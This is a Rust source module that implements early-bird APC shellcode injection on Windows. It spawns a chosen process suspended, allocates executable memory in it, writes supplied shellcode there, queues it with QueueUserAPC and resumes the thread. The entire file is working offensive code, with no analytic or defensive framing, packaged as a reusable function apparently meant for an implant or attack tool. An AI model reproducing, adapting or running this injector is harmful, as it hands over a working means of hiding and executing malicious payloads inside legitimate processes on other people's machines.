use winapi::shared::basetsd::SIZE_T;
use winapi::um::memoryapi::WriteProcessMemory;
use winapi::um::processthreadsapi::CreateProcessA;
use winapi::um::memoryapi::VirtualAllocEx;
use winapi::um::processthreadsapi::QueueUserAPC;
use winapi::um::processthreadsapi::ResumeThread;

pub fn wrapper(process_name: &str, shellcode: &[u8]) -> String {
    inject(process_name, shellcode)
}

fn inject(process_name: &str, shellcode: &[u8]) -> String {
    // Create startup info struct
    let mut si = unsafe { std::mem::zeroed::<winapi::um::processthreadsapi::STARTUPINFOA>() };
    si.cb = std::mem::size_of::<winapi::um::processthreadsapi::STARTUPINFOA>() as u32;

    // Create process info struct
    let mut pi = unsafe { std::mem::zeroed::<winapi::um::processthreadsapi::PROCESS_INFORMATION>() };

    // Create process in suspended state
    let command_line_with_null: Vec<u8> = process_name.bytes().chain(std::iter::once(0)).collect();
    let success = unsafe {
        CreateProcessA(
            std::ptr::null_mut(),
            command_line_with_null.as_ptr() as *mut i8,
            std::ptr::null_mut(),
            std::ptr::null_mut(),
            0,
            winapi::um::winbase::CREATE_SUSPENDED,
            std::ptr::null_mut(),
            std::ptr::null_mut(),
            &mut si,
            &mut pi
        )
    };

    if success == 0 {
        return format!("Failed to create process: {}", process_name);
    }

    // Get the process handle
    let process_handle = pi.hProcess;

    // Allocate memory in the target process
    let remote_buffer = unsafe {
        VirtualAllocEx(
            process_handle,
            std::ptr::null_mut(),
            shellcode.len() as SIZE_T,
            winapi::um::winnt::MEM_COMMIT,
            winapi::um::winnt::PAGE_EXECUTE_READ
        )
    };

    if remote_buffer.is_null() {
        return String::from("Failed to allocate memory in target process");
    }

    // Write the shellcode to the allocated memory
    let written = unsafe {
        WriteProcessMemory(
            process_handle,
            remote_buffer,
            shellcode.as_ptr() as *const winapi::ctypes::c_void,
            shellcode.len() as SIZE_T,
            std::ptr::null_mut()
        )
    };

    if written == 0 {
        return String::from("Failed to write shellcode to target process");
    }

    // Queue the shellcode to be executed
    let apc_result = unsafe {
        QueueUserAPC(
            std::mem::transmute(remote_buffer),
            pi.hThread,
            0
        )
    };

    if apc_result == 0 {
        return String::from("Failed to queue shellcode for execution");
    }

    //resume the thread
    let resume = unsafe {
        ResumeThread(pi.hThread)
    };

    if resume == 0 {
        return String::from("Failed to resume thread");
    }

    format!("Successfully injected shellcode into process: {}", process_name)
}